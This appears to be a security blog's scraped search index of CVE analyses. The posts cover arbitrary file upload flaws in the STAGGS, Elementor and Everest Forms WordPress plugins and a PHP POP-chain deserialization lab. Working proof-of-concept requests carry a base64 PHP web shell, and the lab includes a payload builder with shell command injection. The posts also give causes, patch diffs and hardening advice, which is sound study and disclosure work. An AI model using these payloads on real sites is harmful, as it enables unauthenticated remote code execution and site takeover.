","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway Rigorously check all file types that can affect server behavior, especially .htaccess. Don’t rely only on file extensions; validate both MIME type and actual file content. Do not allow users — even those with Editor privileges — to upload archives that can contain executable content. Clearly separate user upload directories from directories where PHP can be executed. Regularly audit and update plugins; small filtering mistakes can lead to severe RCE. ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress Insert or Embed Articulate Content into WordPress Plugin \u003c= 4.3000000025 is vulnerable to Arbitrary File Upload ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress STAGGS Plugin.","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Arbitrary File Upload vulnerability in the STAGGS plugin allows an attacker to upload a Web Shell to the web server, affecting STAGGS versions from n/a to 2.11.0. CVE ID: CVE-2025-47637 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.11.0 Patched Versions: 2.12.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress STAGGS Plugin ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - STAGGS: 2.11.0 – vulnerable 2.12.0 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability occurs in the function store_final_product_image() in the file /wp-content/plugins/staggs/includes/staggs-functions.php due to not validating the file type before upload. File type validation The patch used a whitelist, accepting only the file types: png,jpg,jpeg,gif. ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis The plugin registered an action hook for unauthenticated users (wp_ajax_nopriv_): staggs-functions.php add_action( 'wp_ajax_nopriv_staggs_get_configuration_form_urls', 'staggs_get_configuration_form_urls_ajax' ); When accessing the endpoint /wp-admin/admin-ajax.php with param action=staggs_get_configuration_form_urls the callback staggs_get_configuration_form_urls_ajax is called staggs-functions.php function staggs_get_configuration_form_urls_ajax() { $response = array(); if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_REQUEST['nonce'], 'sgg_ajax_nonce' ) ) { echo json_encode( $response ); die(); } ... if ( isset( $_POST['image_id'] ) ) { $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) ); // image name based on product title. $image_url = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true ); $response['image_url'] = $image_url; } ... echo json_encode( $response ); die(); } This function checks the nonce from the request; if it doesn’t exist or is invalid it returns an empty response. Tip When searching for the keyword sgg_ajax_nonce, we see the nonce is created with the key AJAX_NONCE and has a comment // image name based on product title. related to the product. Since this section does not require authentication, it may be a mechanism to serve product display to unauthenticated users, and the nonce is inserted directly into the source code. When testing the plugin’s product creation feature, the system creates a post that unauthenticated users can still access. This nonce appears in the returned source when accessing the created product. How the nonce is created Create Product using plugin Nonce taken from response If the nonce is valid, it proceeds to check whether $_POST['image_id'] exists; if it does: It fetches the image name, meaning the product title (as described: // image name based on product title.) Calls store_final_product_image() to save the image and obtain the returned URL Returns a JSON response containing image_url. staggs-functions.php function store_final_product_image( $imagename, $data, $options, $main_image = true) { if ( preg_match( '/^data:image\\/(.*);base64,/', $data, $type ) ) { // Valid base64 image. $data = substr( $data, strpos($data, ',') + 1 ); $type = strtolower( $type[1] ); // jpg, png, gif $data = str_replace( ' ', '+', $data ); $data = base64_decode($data); if ( $data === false ) { throw new \\Exception('Image decode failed. Try again.'); } } ... $upload_dir = wp_get_upload_dir(); $base_dir = $upload_dir['basedir']; // Allow different location. $save_path = apply_filters( 'staggs_image_save_dir', $base_dir . '/staggs' ); if ( ! file_exists( $save_path ) ) { mkdir( $save_path, 0777, true ); } if ( $main_image ) { // Main product image. if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' . $type; } } ... // Always override in case something went wrong earlier file_put_contents( $save_path . \"/{$filename}\", $data ); $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path ); return $image_path_url . \"/{$filename}\"; } The command: preg_match('/^data:image\\/(.*);base64,/', $data, $type) is used to check whether the variable $data is a Base64 Data URI image string or not. Specifically: ^data:image\\/ → string must start with data:image/ (.*) → captures the image format (e.g., png, jpeg, gif, …) ;base64, → followed by the string ;base64, (indicating the image data is Base64-encoded) If it matches, the array $type will contain the format info, for example: $type[1] = 'png'; If it doesn’t match, i.e., $data is not valid Base64 image data, the function returns 0. Then $type is assigned the value of $type[1]. Bug We can pass $data=data:image/php;base64... so $type[1] ='php' if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $op","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"] B --\u003e C{\"wp_verify_nonce() valid?\"} C -- No --\u003e Z[\"Return empty JSON\"] C -- Yes --\u003e D{\"isset($_POST['image_id'])?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"] E --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" } F -- No --\u003e Z F -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"] G --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"] H --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"] graph TD A[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"] B --\u003e C{\"wp_verify_nonce() valid?\"} C -- No --\u003e Z[\"Return empty JSON\"] C -- Yes --\u003e D{\"isset($_POST['image_id'])?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"] E --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" } F -- No --\u003e Z F -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"] G --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"] H --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"] graph TD A[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"] B --\u003e C{\"wp_verify_nonce() valid?\"} C -- No --\u003e Z[\"Return empty JSON\"] C -- Yes --\u003e D{\"isset($_POST['image_id'])?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"] E --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" } F -- No --\u003e Z F -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"] G --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"] H --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"] graph TD A[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"] B --\u003e C{\"wp_verify_nonce() valid?\"} C -- No --\u003e Z[\"Return empty JSON\"] C -- Yes --\u003e D{\"isset($_POST['image_id'])?\"} D -- No --\u003e Z D -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"] E --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" } F -- No --\u003e Z F -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"] G --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"] H --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"] ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Obtain the nonce from the returned source Send a POST request POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=staggs_get_configuration_form_urls\u0026nonce=f281c84283\u0026image_id=1\u0026image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== With PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== being the base64 encoding of \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Request with Web Shell payload Access the returned URL and achieve RCE RCE via file upload ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability allows an unauthenticated attacker to upload arbitrary files (e.g., a web shell) via the plugin’s AJAX endpoint because the file type is not validated before saving. An attacker can obtain the nonce from publicly available source, send a forged data: URI (e.g., data:image/php;base64,...) and create a PHP file on the server, leading to RCE. The issue was fixed in version 2.12.0 by restricting accepted extensions (png, jpg, jpeg, gif). ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway The vulnerability stems from not properly validating the file type/extension before saving; client-side/regex checks are insufficient if the extension and actual content are not constrained. Do not leave important upload actions exposed as nopriv (unauthenticated) endpoints without authentication and strict restrictions. nonce values embedded in publicly accessible source can be collected and reused — do not rely solely on publicly visible nonces to prevent sensitive actions. Validate MIME type, extension, and (if possible) the actual file content on the server; store uploads in non-executable locations or convert them to non-executable. Update the plugin to \u003e= 2.12.0 immediately; check your site for suspicious files in the staggs/ upload directory if the site runs an older version. ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress STAGGS Plugin \u003c= 2.11.0 is vulnerable to Arbitrary File Upload ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/"},{"categories":["CVE Analyst"],"collections":null,"content":"Intro During my research on Insecure Deserialization, I received a lab related to POP Chain (Property-Oriented Programming Chain). This is an interesting type of attack: instead of exploiting a function or command directly, an attacker composes gadgets (magic methods from classes) to achieve a goal — for example, executing system commands (RCE). This post describes my analysis and exploitation of the lab: reviewing the source code, identifying useful gadgets, and building a payload to trigger the call chain (POP chain). The goal is to help you understand the thought process when tackling labs of this kind. The lab I worked on: https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:1:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#intro"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:2:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Source code overview lab.php \u003c?php class User{ public $name; private $memo; function __construct($name){ $this-\u003ename=$name; } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } ?\u003e The main file contains three important classes: User, Note, and Whale. At the end of the file there is an unserialize on input if $_POST['pop'] is provided: if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } Notable points: Line 8: User::__wakeup() creates a Note and assigns it to $this-\u003ememo. Line 23: Note::__toString() calls record() then returns a string. Line 28: Note::record() accesses $whale-\u003e$content. Line 44: Whale::__get() calls system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt');. Line 52: the unserialize(...) call — the attack surface. ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:2:1","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#source-code-overview"},{"categories":["CVE Analyst"],"collections":null,"content":"Execution flow leading to shell Unserialize a User: When a User object is unserialized, the magic method __wakeup() runs. Here __wakeup() initializes a new Note using $this-\u003ename . \"say hello\" as content and 'test_whale' as whale: $this-\u003ememo = new Note($this-\u003ename . \"say hello\", 'test_whale'); Note::__toString() calls record(): __toString() in Note calls record($this-\u003ewhale, $this-\u003econtent) before returning the string. __toString() is invoked when the object is cast to a string. We can abuse $this-\u003ename so that it is an object in the Note; it will be cast to string when concatenated with \"say hello\" at line 9. record() accesses a dynamic property on $whale: Inside record() there is: $test = $whale-\u003e$content; If $whale is a Whale object and $content does not match an existing property, PHP will call the magic Whale::__get($attribute). Whale::__get() executes system(): Whale::__get() contains: system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); Because system() invokes a shell, if $this-\u003ename contains command-breaking characters (for example \"; ls /; echo \"), an attacker can inject and execute shell commands leading to RCE. ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:2:2","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#execution-flow-leading-to-shell"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit Create a file similar to the original but containing code that builds the serialized payload: lab_copy.php \u003c?php class User{ public $name; private $memo; function __construct(){ $this-\u003ename= new Note(\"Top2\",new Whale(('\"; ls /; echo \"'))); } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } $u = new User(); $searialize = serialize($u); echo base64_encode(''. $searialize .''); ?\u003e Run this file and copy the returned base64 string: Returned base64 string Send the request according to the challenge: Successful RCE ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:3:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Elementor Website Builder Plugin","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info An Arbitrary File Upload vulnerability in the Elementor Website Builder plugin for WordPress. This issue affects Elementor Website Builder versions from 3.3.0 to 3.18.1. CVE ID: CVE-2023-48777 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.3.0-3.18.1 Patched Versions: 3.18.2 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Elementor Website Builder Plugin ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Elementor Website Builder: 3.3.0 – vulnerable 3.18.2 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability stems from not validating the file type before saving to the server, allowing an attacker to upload files with dangerous formats. In version 3.18.1, the function handle_elementor_upload() does not verify the file type when processing upload data from the fileData parameter: uploads-manager.php - v3.18.1 public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } uploads-manager.php - v3.18.1 private function save_base64_to_tmp_file( $file ) { $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } In the patch 3.18.2, the developer added a valid file type check before saving by passing an extra parameter $allowed_file_extensions into save_base64_to_tmp_file(), preventing uploads of malicious files: uploads-manager.php - v3.18.2 public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file, $allowed_file_extensions ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } uploads-manager.php - v3.18.2 private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) { $file_extension = pathinfo( $file['fileName'], PATHINFO_EXTENSION ); $is_file_type_allowed = $this-\u003eis_file_type_allowed( $file_extension, $allowed_file_extensions ); if ( is_wp_error( $is_file_type_allowed ) ) { return $is_file_type_allowed; } $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis The template upload process uses Base64 content: the data in $file['fileData'] is decoded with base64_decode and assigned to $file_content: $file_content = base64_decode( $file['fileData'] ); After decoding, save_base64_to_tmp_file() calls create_temp_file() to save this content as a template file on the server: uploads-manager.php - v3.18.1 public function create_temp_file( $file_content, $file_name ) { $temp_filename = $this-\u003ecreate_unique_dir() . $file_name; file_put_contents( $temp_filename, $file_content ); // phpcs:ignore return $temp_filename; } The file path is constructed by concatenating $file_name with the return value of create_unique_dir() — this function creates the temporary template storage path: uploads-manager.php - v3.18.1 public function create_unique_dir() { $unique_dir_path = $this-\u003eget_temp_dir() . uniqid() . DIRECTORY_SEPARATOR; wp_mkdir_p( $unique_dir_path ); return $unique_dir_path; } create_unique_dir() is responsible for creating the temporary template directory, with a structure like: wp-content/uploads/elementor/tmp/\u003cfilename\u003e Where \u003cuniqueId\u003e is generated automatically by uniqid() to ensure the path is unique. wp_mkdir_p() will create the physical directory on the server to store the template. Finally create_temp_file() calls file_put_contents( $temp_filename, $file_content ) to write the contents of $file_content to $temp_filename. Bug By abusing the lack of filename sanitization here, we combine it with a path traversal attack so the file can be written to an accessible location, bypassing the randomness of uniqid() manager.php - v3.18.1 public function import_template( array $data ) { // If the template is a JSON file, allow uploading it. add_filter( 'elementor/files/allow-file-type/json', [ $this, 'enable_json_template_upload' ] ); add_filter( 'elementor/files/allow_unfiltered_upload', [ $this, 'enable_json_template_upload' ] ); // Imported templates can be either JSON files, or Zip files containing multiple JSON files $upload_result = Plugin::$instance-\u003euploads_manager-\u003ehandle_elementor_upload( $data, [ 'zip', 'json' ] ); ... } handle_elementor_upload() is called inside import_template(). According to the developer comment, if the template is a JSON file it is allowed to upload. We set a debugger and perform an upload of a JSON template: Create a post using Elementor Click the folder icon Folder icon location Click the upload icon Upload icon location Upload interface Select a JSON file and upload Debugger jumps to import_template after uploading the JSON file ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"User uploads JSON file\"] --\u003e B[\"import_template()\"] B --\u003e C[\"handle_elementor_upload()\"] C --\u003e D[\"save_base64_to_tmp_file()\"] D --\u003e E[\"create_temp_file()\"] E --\u003e G[\"create_unique_dir()\"] G --\u003e H[\"file_put_contents()\"] H --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"] graph TD A[\"User uploads JSON file\"] --\u003e B[\"import_template()\"] B --\u003e C[\"handle_elementor_upload()\"] C --\u003e D[\"save_base64_to_tmp_file()\"] D --\u003e E[\"create_temp_file()\"] E --\u003e G[\"create_unique_dir()\"] G --\u003e H[\"file_put_contents()\"] H --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"] graph TD A[\"User uploads JSON file\"] --\u003e B[\"import_template()\"] B --\u003e C[\"handle_elementor_upload()\"] C --\u003e D[\"save_base64_to_tmp_file()\"] D --\u003e E[\"create_temp_file()\"] E --\u003e G[\"create_unique_dir()\"] G --\u003e H[\"file_put_contents()\"] H --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"] graph TD A[\"User uploads JSON file\"] --\u003e B[\"import_template()\"] B --\u003e C[\"handle_elementor_upload()\"] C --\u003e D[\"save_base64_to_tmp_file()\"] D --\u003e E[\"create_temp_file()\"] E --\u003e G[\"create_unique_dir()\"] G --\u003e H[\"file_put_contents()\"] H --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"] ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a JSON file containing a web shell PHP \u003c?php system($_REQUEST[\"cmd\"])?\u003e Upload and intercept the request using BurpSuite Change the file extension to PHP combined with path traversal and send the request Request with path traversal and .php Result RCE via file upload ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2023-48777 vulnerability allows users with Contributor privileges to upload malicious files due to the lack of file type validation before saving. This can lead to Arbitrary File Upload and Remote Code Execution (RCE) if the server allows execution of uploaded files. The issue was patched in version 3.18.2 by adding a check for allowed file extensions before writing to disk. ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway Always validate file type before saving. Do not trust Base64 data or file names from the client. Restrict upload permissions and separate upload storage from executable locations. ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress Elementor Website Builder Plugin 3.3.0-3.18.1 Plugin \u003c= 3.3.0-3.18.1 is vulnerable to Arbitrary File Upload ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Everest Forms – Contact Forms, Quiz, Survey, Newsletter \u0026 Payment Form Builder plugin for WordPress is vulnerable to arbitrary file upload, read, and deletion due to missing file type and path validation in the format method of the EVF_Form_Fields_Upload class in all versions up to and including 3.0.9.4. This allows unauthenticated attackers to upload, read, and delete arbitrary files on the affected site’s server, potentially leading to remote code execution, sensitive information disclosure, or site takeover. CVE ID: CVE-2025-1128 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.0.9.4 Patched Versions: 3.0.9.5 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin ","date":"2025-11-09","objectID":"/posts/2025-11-09-cve-2025-1128/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-1128 Analysis \u0026 POC","uri":"/posts/2025-11-09-cve-2025-1128/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.0.9.4 – vulnerable 3.0.9.5 – patched Diff Tool (diff) → Meld or any diff tool of your choice. 